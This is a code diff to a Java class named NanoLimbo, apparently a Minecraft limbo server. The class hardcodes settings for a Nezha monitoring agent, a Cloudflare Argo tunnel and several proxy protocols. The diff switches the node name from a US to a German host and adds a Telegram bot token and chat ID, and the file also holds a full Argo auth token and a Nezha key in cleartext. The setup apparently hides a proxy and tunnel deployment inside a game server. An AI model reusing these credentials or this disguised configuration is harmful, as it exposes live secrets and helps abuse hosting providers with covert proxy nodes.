@@ -128,7 +128,7 @@ public final class NanoLimbo {
         envVars.put("NEZHA_PORT", "443");
         envVars.put("NEZHA_KEY", "0VJGTU7IkOGcSC92qc");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "karlohosting-us.dora.cc.cd");
+        envVars.put("ARGO_DOMAIN", "karlohosting-de.dora.cc.cd");
         envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiMTI5YjVkOTItMTIyMC00ZjZhLTg3OTctNzNjMTVjNDhhYmU4IiwicyI6Ik5UTmtPREJpWW1NdE1EQXlaUzAwTkRFeExUazFOall0WmpRNU1qSTNORE5qT1RNNCJ9");
         envVars.put("HY2_PORT", "1370");
         envVars.put("TUIC_PORT", "");
@@ -137,11 +137,11 @@ public final class NanoLimbo {
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "453472010");
+        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "karlohosting-us");
+        envVars.put("NAME", "karlohosting-de");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
